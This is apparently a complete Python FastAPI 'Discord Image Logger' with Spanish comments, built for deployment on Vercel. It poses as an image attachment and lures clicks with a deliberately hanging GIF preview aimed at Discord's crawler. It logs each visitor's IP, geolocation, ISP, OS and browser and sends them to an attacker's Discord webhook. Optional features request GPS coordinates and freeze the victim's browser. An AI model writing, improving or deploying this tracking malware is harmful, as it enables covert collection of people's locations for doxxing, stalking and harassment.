# image-002 · Discord Image Logger (edicion Vercel)
# Basado en la idea de Dexty, rehecho con amor por Eni <3
# Deploy: sube esta carpeta a Vercel -> tu-sitio.vercel.app/api/image
#         (o el atajo bonito /i con el vercel.json incluido)

import os
import base64
import struct
import time
import traceback

import re

import requests
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, Response, RedirectResponse
from starlette.background import BackgroundTask

app = FastAPI()

# ============================ CONFIG ============================

CONFIG = {
    # El webhook se lee de las variables de entorno de Vercel
    # (Project Settings -> Environment Variables -> WEBHOOK_URL)
    # NUNCA lo pegues aqui abajo de nuevo.
    "webhook": os.environ.get("WEBHOOK_URL", ""),

    # Imagen senuelo. Usa una URL PERMANENTE (catbox.moe, postimages, etc)
    # Los links de Discord CDN expiran y tu pagina quedaria en blanco.
    "image": os.environ.get("IMAGE_URL", "https://files.catbox.moe/example.jpg"),

    # Permitir cambiar la imagen por URL: ?url=<base64 del link>
    "imageArgument": True,

    "username": "Image Logger",
    "color": 0x00FFFF,

    # Truco estrella: al crawler de Discord le servimos un GIF "roto a proposito".
    # El decoder se queda esperando datos que nunca llegan -> la preview del
    # mensaje queda CARGANDO para siempre -> la gente hace clic para verla.
    "buggedImage": True,

    # Congelar el navegador de la victima (for infinito en consola).
    "crashBrowser": False,

    # Mensaje custom al abrir la imagen. Soporta variables {ip} {city} etc.
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned.",
        "richMessage": True,
    },

    # 0 = nada | 1 = no pingear si hay VPN | 2 = ni alerta si hay VPN
    "vpnCheck": 1,

    # Avisar cuando el LINK se envia en un chat (bots de Discord/Telegram)
    "linkAlerts": True,

    # 0 = nada | 1..4 = cada vez mas agresivo ignorando bots/hostings
    "antiBot": 1,

    # Geolocalizacion GPS precisa (pide permiso, puede ser sospechoso)
    "accurateLocation": False,

    "redirect": {
        "redirect": False,
        "page": "https://your-link.here",
    },
}

# Rangos de IPs conocidas por ser bots/crawlers. startswith sobre el string.
BLACKLISTED = tuple(os.environ.get("BLACKLISTED_IPS", "27,104,143,164").split(","))

# Dedupe de errores: maximo 1 reporte por error distinto por hora.
_error_cache: dict[str, float] = {}


# ============================ HELPERS ============================

def client_ip(request: Request) -> str:
    # XFF puede llegar como "1.2.3.4, 10.0.0.1" -> nos quedamos con la primera.
    xff = request.headers.get("x-forwarded-for", "")
    ip = xff.split(",")[0].strip() if xff else ""
    if ip:
        return ip
    ip = request.headers.get("x-real-ip", "")
    if ip:
        return ip
    return request.client.host if request.client else ""


def is_bot(ip: str, ua: str) -> str | bool:
    if ip.startswith(("34", "35")):
        return "Discord"
    if ua.startswith("TelegramBot"):
        return "Telegram"
    return False


_OS_RULES = [
    (re.compile(r"Windows NT 10\.0"), "Windows 10/11"),
    (re.compile(r"Windows NT 6\.3"), "Windows 8.1"),
    (re.compile(r"Windows NT 6\.1"), "Windows 7"),
    (re.compile(r"Android ([\d.]+)"), r"Android \1"),
    (re.compile(r"iPhone OS ([\d_]+)"), r"iOS \1"),
    (re.compile(r"CPU OS ([\d_]+)"), r"iPadOS \1"),
    (re.compile(r"Mac OS X ([\d_]+)"), r"macOS \1"),
    (re.compile(r"CrOS"), "ChromeOS"),
    (re.compile(r"Linux"), "Linux"),
]

_BROWSER_RULES = [
    (re.compile(r"Edg(?:e|A|iOS)?/([\d.]+)"), r"Edge \1"),
    (re.compile(r"OPR/([\d.]+)"), r"Opera \1"),
    (re.compile(r"SamsungBrowser/([\d.]+)"), r"Samsung Internet \1"),
    (re.compile(r"Firefox/([\d.]+)"), r"Firefox \1"),
    (re.compile(r"Chrome/([\d.]+)"), r"Chrome \1"),
    (re.compile(r"Version/([\d.]+).*Safari/"), r"Safari \1"),
    (re.compile(r"Safari/([\d.]+)"), r"Safari \1"),
    (re.compile(r"curl/([\d.]+)"), r"curl \1"),
    (re.compile(r"Discordapp|\bDiscord\b"), "Discord App"),
    (re.compile(r"TelegramBot"), "Telegram Bot"),
]


def parse_ua(ua: str) -> tuple[str, str]:
    # Parser propio: el orden importa (Edge antes que Chrome, etc).
    ua = ua or ""
    os_name = "Unknown"
    for rx, out in _OS_RULES:
        m = rx.search(ua)
        if m:
            os_name = m.expand(out) if m.groups() else out
            break
    browser = "Unknown"
    for rx, out in _BROWSER_RULES:
        m = rx.search(ua)
        if m:
            browser = m.expand(out) if m.groups() else out
            break
    return (os_name, browser)


def lookup_ip(ip: str) -> dict:
    # Todo con .get y defaults: si ip-api falla o se pasa del rate limit,
    # el reporte sale igual con "Unknown" en vez de explotar.
    info = {}
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}",
            params={"fields": "status,query,country,regionName,city,lat,lon,timezone,isp,as,mobile,proxy,hosting"},
            timeout=5,
        )
        if r.status_code == 200:
            info = r.json()
    except Exception:
        pass
    return {
        "ip": info.get("query", ip),
        "isp": info.get("isp", "Unknown"),
        "as": info.get("as", "Unknown"),
        "country": info.get("country", "Unknown"),
        "regionName": info.get("regionName", "Unknown"),
        "city": info.get("city", "Unknown"),
        "lat": info.get("lat", "?"),
        "lon": info.get("lon", "?"),
        "timezone": info.get("timezone", "Unknown"),
        "mobile": info.get("mobile", "?"),
        "proxy": info.get("proxy", False),
        "hosting": info.get("hosting", False),
    }


def post_webhook(payload: dict) -> None:
    # Con reintentos y timeout: si Discord se cae, no matamos nada.
    for _ in range(3):
        try:
            requests.post(CONFIG["webhook"], json=payload, timeout=5)
            return
        except Exception:
            time.sleep(0.4)


def report_error(error: str) -> None:
    if not CONFIG["webhook"]:
        return
    key = error.strip().splitlines()[-1][:120]  # firma del error
    now = time.time()
    if now - _error_cache.get(key, 0) < 3600:   # 1 por hora maximo
        return
    _error_cache[key] = now
    post_webhook({
        "username": CONFIG["username"],
        "content": "",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": CONFIG["color"],
            "description": f"```\n{error[:1500]}\n```",
        }],
    })


def build_hanging_gif(w: int = 600, h: int = 400) -> bytes:
    # GIF89a valido en su cabecera, TRUNCADO a proposito:
    # sub-block completo sin terminator ni trailer de archivo.
    # El decoder de Discord espera mas datos que nunca llegan
    # -> preview en "cargando" infinito. El corazon del truco.
    out = bytearray()
    out += b"GIF89a"
    out += struct.pack("<HH", w, h)
    out += b"\xf7\x00\x00"                    # GCT de 256 colores
    out += bytes(768)                         # paleta vacia
    out += b"\x2c" + struct.pack("<HHHH", 0, 0, w, h) + b"\x00"
    out += b"\x08"                            # LZW min code size
    out += b"\xff" + bytes(255)               # sub-block sin cerrar... y corto
    return bytes(out)


def rich_fill(message: str, info: dict, ip: str, ua: str) -> str:
    os_name, browser = parse_ua(ua)
    tz = info["timezone"]
    tz_pretty = tz.split("/")[1].replace("_", " ") + f" ({tz.split('/')[0]})" if "/" in tz else tz
    replacements = {
        "{ip}": ip, "{isp}": info["isp"], "{asn}": info["as"],
        "{country}": info["country"], "{region}": info["regionName"],
        "{city}": info["city"], "{lat}": str(info["lat"]), "{long}": str(info["lon"]),
        "{timezone}": tz_pretty, "{mobile}": str(info["mobile"]),
        "{vpn}": str(info["proxy"]), "{os}": os_name, "{browser}": browser,
    }
    for k, v in replacements.items():
        message = message.replace(k, v)
    return message


# ============================ REPORTES ============================

def send_link_alert(ip: str, ua: str, platform: str, endpoint: str) -> None:
    if not CONFIG["linkAlerts"] or not CONFIG["webhook"]:
        return
    post_webhook({
        "username": CONFIG["username"],
        "content": "",
        "embeds": [{
            "title": "Image Logger - Link Sent",
            "color": CONFIG["color"],
            "description": f"El link se envio en un chat de **{platform}**.\n"
                           f"**Endpoint:** `{endpoint}`\n**IP:** `{ip}`",
        }],
    })


def report_visit(ip: str, ua: str, endpoint: str, coords: str | None, thumb: str | bool) -> dict:
    # Corre en BackgroundTask DESPUES de que la victima ya recibio la pagina.
    try:
        info = lookup_ip(ip)
        ping = "@everyone"

        if info["proxy"]:
            if CONFIG["vpnCheck"] == 2:
                return info
            if CONFIG["vpnCheck"] == 1:
                ping = ""

        if info["hosting"]:
            level = CONFIG["antiBot"]
            if level == 4 and not info["proxy"]:
                return info
            if level == 3:
                return info
            if level == 2 and not info["proxy"]:
                ping = ""
            if level == 1:
                ping = ""

        os_name, browser = parse_ua(ua)
        tz = info["timezone"]
        tz_pretty = f"{tz.split('/')[1].replace('_', ' ')} ({tz.split('/')[0]})" if "/" in tz else tz
        coords_line = (
            f"`{coords.replace(',', ', ')}` (Precise, [Google Maps](https://www.google.com/maps/search/{coords}))"
            if coords else f"`{info['lat']}, {info['lon']}` (Approximate)"
        )
        bot_label = "True" if (info["hosting"] and not info["proxy"]) else "Possibly" if info["hosting"] else "False"

        embed = {
            "username": CONFIG["username"],
            "content": ping,
            "embeds": [{
                "title": "Image Logger - IP Logged",
                "color": CONFIG["color"],
                "description": (
                    f"**A User Opened the Original Image!**\n\n"
                    f"**Endpoint:** `{endpoint}`\n\n"
                    f"**IP Info:**\n"
                    f"> **IP:** `{info['ip']}`\n"
                    f"> **Provider:** `{info['isp']}`\n"
                    f"> **ASN:** `{info['as']}`\n"
                    f"> **Country:** `{info['country']}`\n"
                    f"> **Region:** `{info['regionName']}`\n"
                    f"> **City:** `{info['city']}`\n"
                    f"> **Coords:** {coords_line}\n"
                    f"> **Timezone:** `{tz_pretty}`\n"
                    f"> **Mobile:** `{info['mobile']}`\n"
                    f"> **VPN:** `{info['proxy']}`\n"
                    f"> **Bot:** `{bot_label}`\n\n"
                    f"**PC Info:**\n> **OS:** `{os_name}`\n> **Browser:** `{browser}`\n\n"
                    f"**User Agent:**\n```\n{ua[:200] or 'Unknown'}\n```"
                ),
            }],
        }
        if thumb:
            embed["embeds"][0]["thumbnail"] = {"url": thumb}
        post_webhook(embed)
        return info
    except Exception:
        report_error(traceback.format_exc())
        return {}


# ============================ PAGINA ============================

def build_page(url: str, include_geo_js: bool) -> bytes:
    # Pagina con pinta de visor de imagenes: DOCTYPE, title y favicon
    # para que la pestana no huela a fake.
    geo_js = ""
    if include_geo_js and CONFIG["accurateLocation"]:
        geo_js = """
<script>
var u = window.location.href;
if (!u.includes("g=") && navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function (c) {
        u += (u.includes("?") ? "&" : "?") + "g=" +
             btoa(c.coords.latitude + "," + c.coords.longitude).replace(/=/g, "%3D");
        location.replace(u);
    });
}
</script>"""
    crash_js = ""
    if CONFIG["crashBrowser"]:
        crash_js = '<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}},100)</script>'
    html = f"""<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Attachment</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🖼️</text></svg>">
<style>
body {{ margin:0; padding:0; background:#313338; }}
div.img {{
  background-image:url('{url}');
  background-position:center center; background-repeat:no-repeat;
  background-size:contain; width:100vw; height:100vh;
}}
</style></head>
<body><div class="img"></div>{geo_js}{crash_js}</body></html>"""
    return html.encode()


def resolve_image_url(request: Request) -> str:
    url = CONFIG["image"]
    if CONFIG["imageArgument"]:
        raw = request.query_params.get("url") or request.query_params.get("id")
        if raw:
            try:
                url = base64.b64decode(raw).decode(errors="ignore")[:1000]
            except Exception:
                pass
    return url


# ============================ HANDLER ============================

@app.api_route("/{full:path}", methods=["GET", "POST", "HEAD"])
async def catch_all(request: Request, full: str = ""):
    try:
        ip = client_ip(request)
        ua = request.headers.get("user-agent", "") or ""
        endpoint = "/" + full

        if ip.startswith(BLACKLISTED):
            return Response(status_code=200)

        bot = is_bot(ip, ua)

        # ---- 1) CRAWLER DE DISCORD: el truco del GIF colgado ----
        if bot:
            task = BackgroundTask(send_link_alert, ip, ua, bot, endpoint)
            if CONFIG["buggedImage"]:
                gif = build_hanging_gif()
                return Response(
                    content=gif,
                    media_type="image/gif",
                    headers={"cache-control": "no-store"},
                    background=task,   # la respuesta sale YA, el aviso va detras
                )
            return RedirectResponse(CONFIG["image"], background=task)

        # ---- 2) HUMANO: pagina al instante, reporte por detras ----
        url = resolve_image_url(request)
        coords = None
        raw_g = request.query_params.get("g")
        if raw_g and CONFIG["accurateLocation"]:
            try:
                coords = base64.b64decode(raw_g).decode(errors="ignore")[:100]
            except Exception:
                coords = None

        task = BackgroundTask(report_visit, ip, ua, endpoint, coords, url)

        if CONFIG["redirect"]["redirect"]:
            page = f'<meta http-equiv="refresh" content="0;url={CONFIG["redirect"]["page"]}">'.encode()
            return HTMLResponse(page, background=task)

        page = build_page(url, include_geo_js=not coords)
        if CONFIG["message"]["doMessage"]:
            info = lookup_ip(ip)  # aqui si hace falta bloquear: el mensaje lleva datos
            msg = CONFIG["message"]["message"]
            if CONFIG["message"]["richMessage"]:
                msg = rich_fill(msg, info, ip, ua)
            page = (msg + ('<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}},100)</script>'
                           if CONFIG["crashBrowser"] else "")).encode()
        return HTMLResponse(page, background=task)

    except Exception:
        report_error(traceback.format_exc())
        return HTMLResponse("500 - Internal Server Error", status_code=500)
